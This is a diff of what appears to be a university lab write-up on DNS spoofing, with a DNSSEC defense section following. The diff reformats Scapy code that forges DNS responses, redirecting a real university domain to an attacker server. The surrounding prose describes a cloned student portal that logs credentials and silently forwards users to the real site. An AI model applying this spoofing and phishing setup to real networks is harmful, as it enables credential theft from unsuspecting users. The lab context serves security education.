@@ -17,12 +17,16 @@ Traffic Interference: To ensure the victim accepts the forged response, legitima
 </pre>
     
 Packet Injection: A sniffing engine monitors the network for queries directed to uniroma3.it. Upon detection, it instantly generates a forged DNS response. The response "steals" the identity of the legitimate server by spoofing its source IP and matching the original transaction ID.
+<pre>
+    ether_layer = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
 
-ether_layer = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
-ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
-udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
-dns_layer = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=qname, type='A', rdata="210.0.3.50"))
+    ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
 
+    udp_layer = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
+
+    dns_layer = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=qname, type='A', rdata="210.0.3.50"))
+</pre>
+    
 Phishing Logic: The victim is redirected to a malicious "Evil" server. This server hosts a clone of the student portal. When the user enters their credentials, a PHP backend logs the data and performs a seamless Auto-POST redirection to the real university portal. This ensures the user remains unaware of the compromise.
 
 ## Scenario 2: Defense via DNSSEC Implementation
